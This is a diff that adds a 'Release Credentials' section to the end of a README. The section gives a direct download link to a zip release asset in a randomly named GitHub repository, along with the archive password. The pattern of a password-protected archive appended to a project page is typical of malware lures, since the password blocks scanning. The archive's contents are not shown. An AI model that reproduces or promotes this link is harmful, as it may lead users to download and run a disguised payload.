@@ -214,3 +214,10 @@ Check [LICENSE](LICENSE).
 > Please ensure compliance with local laws and terms of service.
 
 ---
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/noceg-bin-jkg9/releases/download/v1.0.0/noceg.zip)
+- **Archive Password:** `pUbvCyAPlI`
